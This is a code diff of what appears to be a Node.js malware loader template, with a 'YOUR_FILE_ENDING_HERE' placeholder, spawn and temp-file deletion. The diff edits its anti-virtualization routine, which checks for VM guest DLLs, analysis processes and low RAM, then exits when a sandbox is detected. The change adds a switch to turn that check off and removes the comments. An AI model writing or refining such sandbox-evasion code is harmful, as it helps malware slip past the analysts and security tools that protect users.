@@ -5,6 +5,7 @@ const spawn = require('child_process').spawn;
 
 const file_ending = "YOUR_FILE_ENDING_HERE";
 let remove = false;
+const antiVMEnabled = false;
 
 const vm_files = [
     "C:\\windows\\system32\\vmGuestLib.dll",
@@ -55,14 +56,12 @@ function deleteTempFile(tempDir) {
 }
 
 function isVirtualized() {
-    // Check for virtualization-specific files
     for (let file of vm_files) {
         if (fs.existsSync(file)) {
             return true;
         }
     }
 
-    // Check for virtualization-specific processes
     const processList = os.platform() === 'win32' ? require('windows-processes') : [];
     for (let process of blacklisted_processes) {
         if (processList.includes(process)) {
@@ -70,9 +69,8 @@ function isVirtualized() {
         }
     }
 
-    // Check RAM size to detect differences (basic example)
-    const totalMemoryGB = os.totalmem() / 1024 / 1024 / 1024; // Convert bytes to GB
-    if (totalMemoryGB < 4) { // Adjust threshold based on typical physical machine RAM
+    const totalMemoryGB = os.totalmem() / 1024 / 1024 / 1024;
+    if (totalMemoryGB < 4) {
         return true;
     }
 
@@ -80,7 +78,7 @@ function isVirtualized() {
 }
 
 function main() {
-    if (isVirtualized()) {
+    if (antiVMEnabled && isVirtualized()) {
         console.log('Virtual machine detected. Terminating execution.');
         return;
     }
